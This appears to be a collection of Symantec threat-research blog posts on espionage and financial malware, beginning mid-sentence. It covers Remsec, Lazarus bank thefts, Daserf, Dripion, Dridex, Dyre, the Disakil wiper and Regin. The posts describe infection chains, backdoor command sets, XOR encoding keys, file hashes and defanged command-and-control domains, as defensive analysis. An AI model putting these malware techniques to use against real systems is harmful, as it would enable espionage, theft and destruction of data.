that the group has received 63 payments totaling 1.76 Bitcoin (approximately US$1,023). The majority came from a single payment of 1.5 Bitcoin. Q: Do Symantec products detect the tools released in the leak? A: Symantec and Norton products protect against the malware and exploits found in the leak with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "A previously unknown group called Strider has been conducting cyberespionage-style attacks against selected targets in Russia, China, Sweden, and Belgium. The group uses an advanced piece of malware known as Remsec (Backdoor. Remsec) to conduct its attacks. Remsec is a stealthy tool that appears to be primarily designed for spying purposes. Its code contains a reference to Sauron, the all-seeing antagonist in Lord of the Rings. Strider’s attacks have tentative links with a previously uncovered group,Flamer. The use of Lua modules, which we’ll discuss later, is a technique that has previously been used by Flamer. One of Strider’s targets had also previously been infected byRegin. Strider has been active since at least October 2011. The group has maintained a low profile until now and its targets have been mainly organizations and individuals that would be of interest to a nation state’s intelligence services. Symantec obtained a sample of the group’s Remsec malware from a customer who submitted it following its detection by our behavioral engine. Remsec is primarily designed to spy on targets. It opens a back door on an infected computer, can log keystrokes, and steal files. Strider has been highly selective in its choice of targets and, to date, Symantec has found evidence of infections in 36 computers across seven separate organizations. The group’s targets include a number of organizations and individuals located in Russia, an airline in China, an organization in Sweden, and an embassy in Belgium. The Remsec malware used by Strider has a modular design. Its modules work together as a framework that provides the attackers with complete control over an infected computer, allowing them to move across a network, exfiltrate data, and deploy custom modules as required. Remsec contains a number of stealth features that help it to avoid detection. Several of its components are in the form of executable blobs (Binary Large Objects), which are more difficult for traditional antivirus software to detect. In addition to this, much of the malware’s functionality is deployed over the network, meaning it resides only in a computer’s memory and is never stored on disk. This also makes the malware more difficult to detect and indicates that the Strider group are technically competent attackers. Remsec modules seen by Symantec to date include: Strider is capable of creating custom malware tools and has operated below the radar for at least five years. Based on the espionage capabilities of its malware and the nature of its known targets, it is possible that the group is a nation-state level attacker. Symantec will continue to search for more Remsec modules and targets in order to build upon our understanding of Strider and better protect our customers. Symantec and Norton products detect this threat as Backdoor. Remsec.

    "text": "Symantec has found evidence that a bank in the Philippines has also been attacked by the group that stole US$81 million from the Bangladesh central bank and attempted to steal over $1 million from the Tien Phong Bank in Vietnam. Malware used by the group was also deployed in targeted attacks against a bank in the Philippines. In addition to this, some of the tools used share code similarities with malware used in historic attacks linked to a threat group known as Lazarus. The attacks can be traced back as far as October 2015, two months prior to the discovery of the failed attack in Vietnam, which was hitherto the earliest known incident. The attack against the Bangladesh central banktriggered an alert by payments network SWIFT, after it was found the attackers had used malware to cover up evidence of fraudulent transfers. SWIFT issued a further warning, saying that it had found evidence of malware being used against another bank in a similar fashion. Vietnam’s Tien Phong Bank subsequently statedthat it intercepted a fraudulent transfer of over $1 million in the fourth quarter of last year. SWIFT concluded that the second attack indicates that a “wider and highly adaptive campaign” is underway targeting banks. A third bank, Banco del Austro in Ecuador,was also reported to have lost $12 million to attackersusing fraudulent SWIFT transactions. However, no details are currently known about the tools used in this incident or if there are any links to the attacks in Asia. Symantec has identified three pieces of malware which were being used in limited targeted attacks against the financial industry in South-East Asia: Backdoor. Fimlis, Backdoor. Fimlis. B, and Backdoor. Contopee. At first, it was unclear what the motivation behind these attacks were, however code sharing between Trojan. Banswift (used in the Bangladesh attack used to manipulate SWIFT transactions) and early variants of Backdoor. Contopee provided a connection. While analyzing samples of Trojan. Banswift, a distinct file wiping code was found. Some of the distinctive properties of the wiping code include: Already this code looked fairly unique. What was even more interesting was that when we searched for additional malware containing the exact combination of “control” bytes, an early variant of Backdoor. Contopee and the“msoutc.exe”sample already discussed inthe recent BAE bloganalyzing the Bangladesh attack were also found. Symantec believes distinctive code shared between families and the fact that Backdoor. Contopee was being used in limited targeted attacks against financial institutions in the region, means these tools can be attributed to the same group. Backdoor. Contopee has been previously used by attackers associated with a broad threat group known as Lazarus. Lazarus has been linked to a string of aggressive attacks since 2009, largely focused on targets in the US and South Korea. The group was linked to Backdoor. Destover, a highly destructive Trojan that was the subject of an FBI warning after it was used in an attack against Sony Pictures Entertainment. The FBI concluded that the North Korean governmentwas responsible for this attack. The group was the target of a cross-industry initiative known as Operation Blockbuster earlier this year, which involved major security vendors sharing intelligence and resources in order to assist commercial and government organizations in protecting themselves against Lazarus. As part of the initiative, vendors are circulating malware signatures and other useful intelligence related to these attackers. The discovery of more attacks provides further evidence that the group involved is conducting a wide campaign against financial targets in the region. While awareness of the threat posed by the group has now been raised, its initial success may prompt other attack groups to launch similar attacks. Banks and other financial institutions should remain vigilant.

    "text": "A longstanding cyberespionage campaign has been targeting mainly Japanese organizations with its own custom-developed malware (Backdoor. Daserf). The group, known to Symantec as Tick, has maintained a low profile, appearing to be active for at least 10 years prior to discovery. In its most recent campaign, Tick employed spear-phishing emails and compromised a number of Japanese websites in order to infect a new wave of victims. The group is highly selective in its approach and only appears to deploy its full range of tools once it establishes that the compromised organization is an intended target. Tick also uses a range of hacktools to map the victim’s network and attempt to escalate privileges further. Daserf’s main purpose is information stealing and the Trojan is capable of gathering information from infected computers and relaying it back to attacker-controlled servers. Tick’s most recent attacks have concentrated on the technology, aquatic engineering, and broadcasting sectors in Japan. Symantec discovered the most recent wave of Tick attacks in July 2015, when the group compromised three different Japanese websites with a Flash (.swf) exploit to mount watering hole attacks. Visitors to these websites were infected with a downloader known as Gofarer (Downloader. Gofarer). Gofarer collects information about the compromised computer and then downloads and installs Daserf. Tick also used spear-phishing emails in these recent attacks. While Symantec did not find the emails themselves, it did identify the use of an exploit designed to take advantage of a vulnerability in Microsoft Office documents (CVE-2014-4114). This was used to distribute malware in addition to the watering hole activity. Daserf appears to be custom-developed for use in Tick’s cyberespionage campaigns. Once installed, it establishes a remote connection to Tick’s command and control server, providing the attacker with access to the compromised computer. Once the malware is installed on a targeted computer, the attackers attempt to enumerate the network and escalate their privilege level. To do this, Tick uses a number of publicly available hacktools such as Mimikatz, GSecdump, and Windows Credential Editor. The tools are downloaded and deployed to the original install directory previously created by the malware. Tick’s primary objective appears to be the theft of sensitive information from targeted Japanese organizations. To date, Symantec has observed the group attempting to steal emails and documents such as PowerPoint presentations. The Daserf Trojan employs a number of tactics to avoid detection. Once collected, the stolen data is hidden in password-protected .rar archives. Daserf also uses file and folder names related to legitimate programs often found in Windows environments in order to blend in. Observed folder names include HP, Intel, Adobe, and perflogs and folders are generally created in either the root drive or the Application Data or Program Files folders. File names used in recent attacks include adobe.exe, adobe_sl.exe, intel.exe, and intellog.exe. Tick uses compromised web servers to distribute malware and, in some instances, for its command and control (C&C) infrastructure. However, in most cases, it relies on its own infrastructure for C&C purposes. In its most recent campaigns, the group registered the domains used for C&C servers days after the malware was compiled. For example, one of the variants of Daserf used was compiled on July 8, 2015. This sample was seen contacting the C&C domain www[.]dreamsig[.]com, which was first registered on July 13, 2015, five days after the compilation date. This pattern occurred in multiple Daserf samples. Another interesting aspect of the communication between the malware and the C&C infrastructure is how the malware changes the URL from a randomly chosen variable selected from a predefined list. Predefined list from Daserf MD5: 765017E16842C9EB6860A7E9F711B0DB Symantec identified multiple C&C domains used by Tick. Unfortunately, Tick frequently used either privacy protection services or domain brokers to mask registration information. These tactics are used to make discovery and attribution more difficult. The majority of the malware analyzed was not digitally signed. However, a small percentage was signed with a stolen digital certificate. It is unclear why the certificate was used so sparingly, since signed malware would receive a greater level of trust and reduce the risk of detection. It is possible that the certificate was used against a target that had a secure environment which may have required binaries to be signed in order to interact with the operating system. The issuer of the certificate has been informed of its misuse and confirmed that it would be revoked. The use of compromised websites to infect victims results in unintentional infections, making it difficult to identify the motives of the attacker. By searching for evidence of post-infection activity, Symantec identified seven organizations where Tick had mounted persistent post-compromise attacks. These organizations were primarily large Japanese technology, engineering, and media firms. The seven organizations therefore appear to be Tick’s intended targets. In addition to seeing post-compromise tools used in these attacks, the length of time the attackers were active on the networks provided additional evidence that these were high-value targets. The longest time Tick was active in a victim’s environment was 18 months. The average timeframe was five months and the number of infected hosts in a victim’s network ranged from 3 to 15 systems. Tick has left a trail of evidence indicating that its activity began as early as 2006. In earlier attacks, the group used malicious Microsoft Word documents to infect victims, with compromised websites being added to the mix as a more recent attack vector. Tick appears to be a well-organized group, with the funding and capability to develop and update its malware. It has the ability to compromise legitimate infrastructure to use for malware distribution and has access to stolen digital certificates to sign its malware when needed. Tick primarily uses purchased infrastructure for its C&C servers and has been able to stay off the radar since 2006. Tick exhibits all the hallmarks of an advanced cyberespionage group. The long lifespan of the group, as well as the consistent targeted attacks against specific industries, support this theory. The individuals or organization behind Tick’s operations has an interest in Japanese technology along with Japanese media and broadcasting organizations. While Tick’s tactics may change over time, the group’s history indicates that its focus will continue to be a narrow range of targets, mainly in Japan.

    "text": "In late August 2015, Symantec identified a previously unknown back door Trojan (Backdoor. Dripion) infecting organizations primarily located in Taiwan, as well as Brazil and the United States. Dripion is custom-built, designed to steal information, and has been used sparingly in a limited number of targeted attacks. The attackers behind this campaign went to some lengths to disguise their activities, including using domains names disguised as antivirus (AV) company websites for their command and control (C&C) servers. These attacks have some links to earlier attacks by a group called Budminer involving the Taidoor Trojan (Trojan. Taidoor). The threat posed by custom malware such as Dripion illustrates the value of multilayered security. Unknown threats may evade signature-based detection, but can be blocked by other detection tools which identify malicious behavior. Our investigation began when we received three file hashes, which we determined to have the functionality of a back door with information-stealing capabilities. The malware appeared to be new, rarely detected, and not publicly available. As we analyzed the binary and compared it against other known back door Trojans, we realized this was custom-developed malware. Developing a back door with information-stealing capabilities designed to evade detection requires both knowledge and funding. Usually when we see a new back door Trojan like this, it is tied to organizations involved in cyberespionage campaigns. One of the first steps taken when investigating malware is to determine how it is getting onto a victim’s computer. Many publicly available downloaders exist; however, only a few unique downloaders have been used over the past few years that have been exclusive to cyberespionage activity. Since Dripion appeared to be used by a single attacker against a small target group, we wanted to determine if the downloader could provide additional evidence to help attribute the threat to any known threat groups. The downloader was identified as Downloader. Blugger (MD5: 260f19ef39d56373bb5590346d2c1811). It is not a new piece of malware, having been in existence since at least 2011. How the victim was infected with Blugger is currently unknown. Blugger used encryption to make its infrastructure and commands queried in the URL requests harder to detect. After decrypting however, we identified the following URL requests: Both of the domains we analyzed in the URLs requested by the downloader are publicly accessible blogs. The downloader contacts these blog URLs in order to retrieve Dripion for installation. The blog posts are primarily in English yet most of the targets are based in Taiwan. As illustrated in Figure 1, one of the blogs references US healthcare spending. It is unknown if the attacker created the blog or simply compromised another to use in their attacks. If the blog was compromised, then the attacker likely would not create posts themselves as it would show the blog’s creator that something was awry. If the blog was created by the attacker, it may be an attempt to develop a blog with topics that would likely be of interest to the intended target. Most of the blogs were related to news events. The Dripion back door TrojanOnce Dripion is installed, the attacker can access the user’s computer. Dripion has the functionally of a back door Trojan, letting attackers upload, download, and steal pre-determined information from the victim, and execute remote commands. Information such as the victim’s computer name and IP address are automatically transmitted to the C&C server upon the initial infection. GoSleepSleeps for 10 minutes GoKillAttempts to delete itself and ends its activities GoByeDisconnects from the computer nodataSimilar to GoBye CommandExecute command (lpCommandLine in CreateProcessA), redirect result through pipe to .tmp file and Download file UpFileWrite data in file on victim's computer DownFileWrite data to a remote open file (InternetWriteFile). The .tmp file used may be deleted after success operation. ExecuteFileCreate a new process (CreateProcessA) Table1. Commands associated with the Dripion malware Additionally, the developer of the Dripion malware used XOR encoding for both the binary configuration file (XOR: 0xA8) as well as network requests with the C&C server (XOR: 0xA3), to make detection more difficult. Dripion has been identified in multiple variations and has version numbers hardcoded within the malware. This indicates that the attackers have the ability to both create and develop their own custom malware as well as update their code to provide new capabilities and make detection more difficult. The use of publicly accessible blogs to distribute malware is a tactic we have seen previously, but few cyberespionage groups have used this technique. Fewer still have used this strategy to deliver custom-developed malware not often seen in the wild. The first piece of evidence pointing towards a link with previous cyberespionage campaigns was the use of the Blugger downloader, which has only been used by a group Symantec calls Budminer. This group has used Blugger to distribute its own custom malware known as Taidoor (Trojan. Taidoor). Symantec haspreviously written about Budminer’s Taidoor campaigns. Significantly, this is the first time we have seen Blugger used to deliver malware other than Taidoor. Further investigation uncovered a second tie with earlier Budminer activity. One of the Blugger samples associated with Dripion connected with a root domain also used in Taidoor-related activity. Both of the URL queries originated from the Blugger downloader which connected to the blog classic-blog.[REDACTED DOMAIN 1].com. They then call out to subdomains of the domain [REDACTED DOMAIN 3].net. Both Dripion and Taidoor not only connected to the same website (classic-blog.[REDACTED DOMAIN 1].com) but also used the same URL (classic-blog.[REDACTED DOMAIN 1].com /nasyzk/[ENCODED TEXT]) to obtain the encrypted C&C configuration. Symantec first identified activity involving Dripion in September 2015. Based on the timestamp of the earliest known sample however, Dripion may have been in existence since 2013. The Dripion activity that we have analyzed is extremely targeted and has involved far fewer victims compared to the number of users infected with Taidoor. The similarity between the two sets of activity is the number of unique file hashes found infecting users located in Taiwan. Unfortunately, we need more data to determine if the timestamps associated with Dripion dating back to November 2013 (7ad3b2b6eee18af6816b6f4f7f7f71a6) are legitimate or if they have been forged. The earliest known Dripion activity we were able to validate took place in November 2014. Despite the one-year gap in activity, it is possible that campaigns involving Dripion happened during this period and went undetected due to its small target window. Another interesting tactic used to deceive potential targets lies within the C&C infrastructure. The attackers created multiple domains with names similar to that of legitimate companies and websites in the antivirus community. For example the domains hyydn.nortonsoft[.]com and mhysix.mcfeesoft[.]com were both C&C domains used in attacks. Using typo-squat domains to mimic legitimate sites is a tactic frequently used to trick the targets as well as defenders, in an effort to make the domains blend in with normal activity. We began this investigation with what we believed was a new campaign using an unidentified back door Trojan against targets primarily in Taiwan. As the investigation grew we found multiple ties between this newly discovered attack and activity associated with the Budminer cyberespionage group: We compared Dripion against Taidoor malware samples to determine if there was any shared code or if it may have originated from the same developer. Our findings concluded there were no similarities between the two malware families. However, the downloader used by both malware families has unique attributes, and we believe it to be from the same developer. So what does all this mean? Attribution of cyberespionage groups is difficult and needs to be done carefully based on fact and not assumptions. We have a number of ties between the two sets of activity. Not all of the ties are strong on their own, but together provide a strong case that there is a relationship between the groups targeting Taiwan using Dripion and Taidoor malware. Based on the evidence we have presented Symantec attributed the activity involving the Dripion malware to the Budminer advanced threat group. While we have not seen new campaigns using Taidoor malware since 2014, we believe the Budminer group has changed tactics to avoid detection after being outed publicly in security white papers and blogs over the past few years. This investigation is just one example of Symantec’s ongoing effort to identify unknown emerging threats.

    "text": "A collaborative cross-industry operation has targeted an aggressive threat group known as Lazarus. The initiative, called Operation Blockbuster was led by analytics firm Novetta and aims to significantly bolster defenses against the cyberespionage group and its disruptive campaigns. Symantec has been tracking attacks associated with Lazarus since 2009. It has been linked to a wide range of incidents, several of which involved highly destructive malware. Lazarus appears to be particularly focused on targets in the US and South Korea. Announced today, Operation Blockbuster involves major security vendors sharing intelligence and resources in order to assist commercial and government organizations in protecting themselves against Lazarus. As part of the initiative, vendors will circulate malware signatures and other useful intelligence related to these attackers. Active since at least 2009, Lazarus is a well-resourced adversary, capable of mounting cyberespionage operations in addition to high-profile destructive attacks. There is some evidence to suggest that Lazarus may consist of several associated groups of attackers. If this is the case, then it is possible that these groups are acting in concert, under the direction of one entity. Lazarus has been linked to a series of attacks since 2009. Symantec has observed commonalities between multiple targeted campaigns it may have been involved with. Lazarus is notable for its use of aggressive and destructive tactics, such as the use of disk-wiping malware, to cause maximum disruption to its targets One of the earliest attacks linked to Lazarus occurred when distributed denial of service attacks (DDoS) attacks knockeda number of US and South Korean websites offline. A Trojan known as Dozer (detected by Symantec as Trojan. Dozer) mounted the DDoS attacks using computers it had previously compromised. Dozer was spread through emails in a campaign involving a number of worms (detected as W32. Dozer, W32. Mydoom. A@mm, and W32. Mytob!gen). A similar wave of DDoS attacks hit South Korean websites in 2011, this time involving more destructive malware known as Trojan. Koredos. The Koredos Trojan not only used the infected computer to mount DDoS attacks; it also wiped the computer after a short period of time. Upon infection, the Trojan scanned for a number of different file types and copied them into an inaccessible encrypted .cab file before deleting the originals. A number of files that the Trojan searched for were related to software predominantly used in Korea (e.g. .alz, .gul, and .hwp). After this, the Trojan delivered the coup de grâce by deleting the master boot record (MBR) on all connected drives between 7 and 10 days after the initial infection. This resulted in Windows being unable to restart, effectively rending the computer unusable. Lazarus was also linked to aseries of destructive attacks against a number of South Korean corporations in 2013. Banks, broadcasters, and telecoms companies were among those affected. The attacks were reported to have compromised the targets’ servers with a disk-wiping Trojan (detected by Symantec as Trojan. Jokra). In addition to this, one telecoms firm had its website defaced with an animated image of skulls and a message from the alleged attackers, who called themselves the “Whois” team. Aggressive attacks linked to Lazarus continued in 2014and the group was linked to Backdoor. Destover, a highly destructive Trojan that was the subject of an FBI warning after it was used in an attack against Sony Pictures Entertainment. The FBI concluded that the North Korean governmentwas responsible for this attack. Although used against US targets, Destover shared several links to earlier attacks directed at targets in South Korea. Some samples of Destover reported to a command and control (C&C) server that was also used by a version of Trojan. Volgmer, which was crafted to attack South Korean targets. The shared C&C server indicated that the same group may have been behind both attacks. An updated version of this malware (detected as Trojan. Volgmer. B) has been used in more recent attacks against large South Korean companies. Some of the most recent activity linked to Lazarusinvolved a Trojan detected as Backdoor. Duuzer. Although detected in a range of locations, one of the threat’s targets was the South Korean manufacturing industry. Duuzer’s main function appears to be cyberespionage. The Trojan provides attackers with remote access to the compromised computer, and allows them to download additional files and steal data. There was also some evidence to suggest that the attackers behind Duuzer were spreading two other threats, detected as W32. Brambul and Backdoor. Joanap, to target more organizations in South Korea. Both pieces of malware appear to be designed to download extra payloads and carry out reconnaissance on infected computers. Ongoing vigilance requiredAttacks associated with Lazarus have frequently been highly destructive. Aside from the level of aggression displayed, Lazarus is notable for the range of tools used and the fact that it is linked to destructive attacks and lower-profile, espionage operations. By pooling together our respective insights into Lazarus, Symantec and other members of the Operation Blockbuster team hopes to strike a blow to this group while ensuring that our customers have robust protection against its tools. ProtectionSymantec and Norton products protect against threats associated with Lazarus with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "Tidal waves of spam are fuelling the growth of the Dridex Trojan, which has emerged as one of the most dangerous financial threats over the past year. The sheer size of the spam campaigns spreading Dridex (detected by Symantec as W32. Cridex) can sometimes overwhelm organizations hit by them. Symantec analysis of recent Dridex spam campaigns found that they are operating on a vast scale, with millions of new emails being sent out on a daily basis. The attackers behind Dridex are disciplined and professional. They operate on a standard working week, continually refine the malware, and put significant effort into disguising their spam campaigns as legitimate emails. As detailed in a newSymantec whitepaperpublished today, at least 145 Dridex spam campaigns were observed during one sample 10-week period. The average number of emails blocked by Symantec per campaign was 271,019, indicating that the total number of emails being sent every day runs to millions. Almost three quarters (74 percent) of Dridex spam campaigns used real company names in the sender address and frequently in the email text. The vast majority of spam campaigns were disguised as financial emails, such as invoices, receipts, and orders. The spam was heavily focused on English speakers, with the majority of emails purporting to come from English-speaking companies. Dridex is mainly used to steal banking credentials. The malware is configured to target the customers of nearly 300 different organizations in over 40 regions. Dridex is heavily focused on customers of financial institutions in wealthy, English-speaking countries, with the majority of targeted organizations located in these countries. The attackers also prioritized other European nations, along with a range of Asia-Pacific regions. The number of Dridex infections detected by Symantec rose during 2015. Between January and April, there were less than 2,000 infections per month. Infection numbers spiked considerably in the following months, hitting almost 16,000 in June before dropping and stabilizing at a rate of 3,000 to 5,000 per month in the final quarter. Dridex infections were detected in a wide range of regions during 2015. English-speaking countries, such as the US, UK, and Australia experienced high rates of infection. This was due to how the attackers configured the malware to attack the large number of banks in these regions, as well as the number of English-language spam campaigns spreading the Dridex Trojan. Western European countries, including France, Germany, Austria, and Switzerland also experienced high infection rates. The level of activity surrounding Dridex indicates that a large cybercrime group is behind the malware. The US Department of Justicehas said that the botnet is “run by criminals in Moldova and elsewhere.” In October 2015,an international law enforcement operationsaw one man charged alongside a coordinated effort to sinkhole thousands of compromised computers, cutting them off from the botnet’s control. It appears this may have only been a partial success as Dridex continues to propagate, indicating that many key elements of the operation are still functioning. The group is likely to continue to pose a serious threat during 2016. A multi-layered defense strategy maximizes protection against aggressive threats such as Dridex. The following Symantec and Norton products will help guard against infection: Intrusion prevention system detections For more information and a detailed analysis of the Dridex threat, read our whitepaper: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "The cybercrime group controlling the Dyre financial fraud Trojan appears to have suffered a major blow followinga Russian law enforcement operation in November. Symantec telemetry has confirmed a virtual cessation of the group’s activities. Dyre (detected by Symantec as Infostealer. Dyre) is spread through email spam campaigns and no Dyre-related spam campaigns have been observed since November 18. Detections of the Dyre Trojan and associated malware have also dropped dramatically since mid-November. Dyre is primarily spread through email spam campaigns, most of which masquerade as business documents, voicemail, or fax messages. The Dyre group had been running email campaigns on most weekdays, dispatching between one and 15 separate email campaigns per day. However, Dyre-related spam campaigns halted abruptly on November 18 and none have been observed since then, indicating a major disruption in the group’s operations. Dyre spam campaigns come with a malicious attachment, which, if opened, will install the Upatre downloader on their computer (detected by Symantec as Downloader. Upatre). Upatre collects information about the victim’s computer, attempts to disable security software, and finally downloads and installs the Dyre Trojan. The Dyre group has been one of the main users of Upatre in over the past year. Symantec telemetry indicates a huge fall in the number of Upatre infections since November. The monthly infection rate has fallen below 20,000, after reaching a high of more than 250,000 per month in July 2015. The number of infections involving the Dyre Trojan itself has also dropped off significantly in the same period. The infection rate was running above 9,000 a month in early 2015. Since November it has fallen to below 600 per month. Prior to this takedown, Dyre had emerged as one of the most dangerous financial fraud operations. The Dyre Trojan is configured to defraud the customers of more than 1,000 banks and other companies worldwide. Consumers in English speaking countries, in particular the US and UK were most at risk, since this is where the largest numbers of targeted banks were located. Dyre targets Windows computers and can defraud victims by snooping on their online banking sessions, stealing their credentials, and sending them back to the attackers. Dyre is also used to infect victims with additional malware and Symantec has to date seen at least seven other malware families being pushed out to infected computers. In many cases, the victim is added to a botnet, which is then used to power further spam campaigns and infect more victims. The move against Dyre appears to be one of the most successful of a number of recent takedown operations against similar financial fraud threats. Unless all of the key figures are arrested and major infrastructure seized, cybercrime groups can quickly rebuild their operations in the aftermath of a law enforcement swoop. For example,an October 2015 operation against Dridex, one of the other major financial fraud Trojans currently in operation, appears to have had a limited impact on its operations. While one man was charged and thousands of compromised computers were sinkholed, the rate of Dridex infections did not abate following the takedown. Early indications are that the operation against Dyre has been quite successful, with no sign of the group attempting to re-establish itself. Whether the threat will disappear entirely will become apparent in the coming months.

    "text": "A highly destructive Trojan (detected by Symantec as Trojan. Disakil), reportedly used in recent attacks against the Ukrainian energy sector, was also earlier used against media targets in the same country. Symantec telemetry confirms that several computers in a major Ukrainian media company were compromised by Disakil in late October and may have been destroyed by the malware. One computer at the media company was compromised by a new variant of the BlackEnergy Trojan (detected by Symantec as Backdoor. Lancafdo). The attackers appear to have used this infection to retrieve administrator credentials and used them to execute Disakil on a number of computers. Communication from these computers halted after Disakil was executed, suggesting that it succeeded in wiping them and rendering them inoperable. The group behind the Black Energy Trojan isknown as Sandworm and has a history of targeting organizations in Ukraine. It has also been known to attack NATO, a number of Western European countries, and companies operating in the energy sector. While Symantec does not have telemetry relating to more recent Disakil targets, the malware has been linked by others to attacks in late December against the energy sector in the Ukraine, which led to power outages in the country. Apress statementon theSecurity Service of Ukraine(SBU) website, alleged the discovery of malicious software responsible for these outages on the networks of regional power companies. According to the SBU press statement, the cyberattack was accompanied by a barrage of phone calls to their technical support telephone numbers, which would have acted like a denial of service (DoS) attack. Ablogfrom the SANS ICS team meanwhile reported that it received a sample of Disakil from a trusted source which was used in one of the attacks, on December 23. While Symantec cannot confirm Disakil has been used in any cyberattack causing power outages at this time, we can confirm its destructive nature. Disakil is a multi-stage threat whose main characteristic is its appetite for destruction. If executed, it sets about rendering the infected system unusable by using a number of relatively simple but effective techniques such as overwriting the MBR (Master Boot Record) and overwriting certain file types with junk data. It also attempts to cover its tracks by clearing Windows log files and destroying the malware structure before restarting the system. A notable feature of Disakil is that it attempts to stop and delete a service named “sec_service”. This service appears to belong to ‘Serial to Ethernet Connector’ software byEltima. This software allows access to remote serial ports over network connections. A lot of legacy SCADA systems still use serial ports forRTU(Remote Terminal Unit or Remote Telemetry Unit) communications. This software is the type of solution a company would implement in their environment for communicating remotely with these legacy devices. According tomanufacturers, RTU features can include discrete alarms to monitor device failure, redundant backup communication for monitoring during a LAN failure and analog alarm inputs which monitor voltage, temperature, humidity and pressure. Hypothetically, if an attacker knew that their target was using this software for communicating with their legacy SCADA devices, stopping the service and any communications would increase the potential for damage within their environment. Attacks of this nature against the energy sector are not unheard-of. In 2012 Symantec reported on theShamoon attacks, where at least one organization in the energy sector was attacked using very similar techniques to render the targeted system unusable. The destructive capabilities of Disakil would make it ideal for use in any attack looking to inflict severe damage to a target’s environment. ProtectionSymantec and Norton products protect against Disakil and related threats with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "An international law enforcement crackdown against the Dridex botnet has seen one man charged and a coordinated effort to sinkhole thousands of compromised computers, cutting them off from the botnet’s control. The operation, which involvedthe FBI in the US, the UK National Crime Agency, and a number of other international agencies, may seriously disrupt a cybercrime enterprise which has stolen tens of millions of dollars from victims worldwide. Dridex, which is detected by Symantec as W32. Cridex and also known as Bugat, is a financial threat that adds the infected computer to a botnet and injects itself into the victim’s web browser in order to steal information, including banking credentials. The malware is usually spread through phishing emails designed to appear to come from legitimate sources in order to lure the victim into opening a malicious attachment. It is also capable of self-replication by copying itself to mapped network drives and attached local storage such as USB keys. As is common with most financial attackers, the Dridex group regularly changed its tactics and most recently has been observed using malicious macros in Microsoft Office documents attached to emails to infect computers. As reported in Symantec’sState of financial Trojans 2014whitepaper, Dridex was the third-largest financial threat last year, accounting for some 29,000 detections. Nevertheless, this represented a decrease, with the number of infections down 88 percent since 2012. Recent telemetry suggests that the threat has enjoyed something of a resurgence in activity, with detections beginning to increase again in the past few months. The attackers behind Dridex have targeted a broad range of countries. The largest number of detections in 2015 was in the US. This was followed by Japan and Germany, with significant numbers of infections also seen in the UK, Canada, Australia, and a number of other European countries. Yesterday’s operation saw a 30-year-old Moldovan man charged by prosecutors in the US for offences including criminal conspiracy, unauthorized computer access with intent to defraud, damaging a computer, wire fraud, and bank fraud. His extradition to the US is currently being sought following his arrest in Cyprus in August. The FBI also obtained an injunction permitting it to start sinkholing Dridex infections by redirecting traffic from infected computers away from command-and-control (C&C) servers to benign substitute servers. This sinkholing operation is also being supported by the UK National Crime Agency. This is the latest in a series of recent takedowns against major financial fraud cybercrime groups, following earlier operations againstGameover Zeus,Shylock, andRamnit.

    "text": "Symantec’s continuing investigation into the Regin Trojan has cast new light on the cyberespionage tool, revealing a wider range of capabilities and a complex infrastructure supporting the threat. Regin was uncovered last year by Symantecand remains one of the most advanced spying tools discovered to date. The malware has been in circulation since at least 2008 and has been used against a range of targets, including government organizations, infrastructure operators, businesses, researchers, and private individuals. Regin is a five-stage threat, with each stage loading and decrypting the next one. The malware is modular in structure, which allows its controllers to add and remove specific features depending on the target. Some Regin modules control basic functions of the malware, such as networking or handling Regin’s encrypted virtual file system (EVFS). Other modules act as payloads, dictating the functionality of each Regin infection. As outlined in an updated technical whitepaper, Symantec has found 49 new modules, bringing the total number of Regin modules uncovered to 75. This remains an incomplete list. A number of other Regin payloads are known to exist since some modules analyzed contain references to them. Symantec has found an extensive command-and-control (C&C) infrastructure supporting Regin infections. The attackers have devised a complex system for communication with C&C servers, in which traffic is relayed through a network of Regin-infected computers. Compromised computers can act as a proxy for other infected computers and peer-to-peer (P2P) communications are used. The networking protocols used by the malware are extensible and can be configured between each pair of Regin-infected computers, providing the attackers with a granular level of control over C&C communications. All C&C communications use strong encryption and follow a two-stage protocol, where the attackers contact the infected computer on one channel and instruct it to open communications on another. A single Regin module (0009h) is responsible for the core handling of communications protocols, while each individual protocol has its own separate module. A total of six transport protocols have been identified: ICMP, UDP, TCP, HTTP Cookies, SSL, and SMB. Regin’s P2P communications capability sees each Regin infection assigned a virtual IP address, forming a virtual private network (VPN) on top of the physical network of the infected computer. This P2P capability allows the attackers to maintain deep access to critical assets within compromised organizations and mask core infrastructure belonging to the group. Traffic between nodes can be configured to match expected protocols based on where the nodes are placed on a network, adding a further degree of stealth to communications. Regin’s authors facilitate communication between modules with a lightweight remote procedure call (RPC) mechanism. This RPC mechanism appears to be custom-built. The RPC mechanism allows for procedure calls to be made locally and across the network of Regin-infected computers. Operators can directly call any procedure on the Regin network to remotely control, install, or update modules, or change module configuration by replacing EVFS files. Despite the threat’s exposure last year, it is unlikely that the group behind this malware has ceased operations. Its track record and available resources mean it is probable that the group will re-equip itself with a new threat or upgrade Regin in a bid to evade detection. The latter is the most likely course of action, given the time it would take to develop an equally capable malware framework from scratch. In terms of technical capabilities, Regin was several years ahead of most other threats. Its impact may continue to be felt as other, less advanced threat actors draw inspiration from it and copy its features in a bid to improve their own tools. Indicators of compromise for security administrators and more detailed technical information can be found in our updated technical paper−Regin: Top-tier espionage tool enables stealthy surveillance Symantec and Norton products detect this threat as Backdoor.

